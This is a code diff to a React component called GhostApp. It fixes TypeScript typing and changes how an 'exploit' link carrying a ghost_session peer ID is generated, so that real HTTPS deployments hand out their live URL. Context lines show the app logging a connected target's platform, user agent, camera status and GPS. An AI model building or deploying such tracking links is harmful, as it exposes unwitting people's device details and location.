@@ -285,7 +285,8 @@ export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
                     addLog(` > Platform: ${data.data.platform}`);
                     addLog(` > Agent: ${data.data.userAgent}`);
                     addLog(` > Cam Status: ${data.data.mediaStatus}`);
-                    setTarget(prev => ({ ...prev, ...data.data, status: 'Online' }));
+                    // Explicitly type 'prev' to fix TS7006 error
+                    setTarget((prev: any) => ({ ...prev, ...data.data, status: 'Online' }));
                     setStep('control');
                 }
                 if (data.type === 'gps') {
@@ -295,7 +296,8 @@ export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
             
             conn.on('close', () => {
                 addLog("[-] Target disconnected.");
-                setTarget(prev => ({ ...prev, status: 'Offline' }));
+                // Explicitly type 'prev' to fix TS7006 error
+                setTarget((prev: any) => ({ ...prev, status: 'Offline' }));
             });
         });
 
@@ -334,18 +336,33 @@ export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
     const getExploitUrl = (forceExternal = false) => {
         if (typeof window === 'undefined') return '';
         
-        // 1. Check for Blob/Preview Environment
-        const isPreview = window.location.protocol === 'blob:' || window.location.hostname.includes('webcontainer') || window.location.hostname.includes('stackblitz');
+        // 1. Check if we are in a Preview/Sandbox environment
+        const isPreview = window.location.protocol === 'blob:' || 
+                          window.location.hostname.includes('webcontainer') || 
+                          window.location.hostname.includes('stackblitz');
         
+        // 2. Check if we are on a secure production URL (like Vercel)
+        const isProductionSecure = window.location.protocol === 'https:';
+
+        // If we are on Vercel/Production HTTPS, ALWAYS use the real URL, unless specifically debugging internals.
+        if (isProductionSecure && !isPreview) {
+             const url = new URL(window.location.href);
+             url.search = ''; 
+             url.hash = '';
+             url.searchParams.set('ghost_session', peerId);
+             return url.toString();
+        }
+        
+        // If in sandbox (WebContainer/StackBlitz), use internal protocol unless forced
         if (isPreview && !forceExternal) {
             return `cloudos://exploit?ghost_session=${peerId}`;
         }
         
-        // 2. Production URL Generation
+        // Fallback / Development
         try {
             const url = new URL(window.location.href);
-            url.search = ''; // Clear existing params
-            url.hash = '';   // Clear existing hash
+            url.search = '';
+            url.hash = '';
             url.searchParams.set('ghost_session', peerId);
             return url.toString();
         } catch (e) {
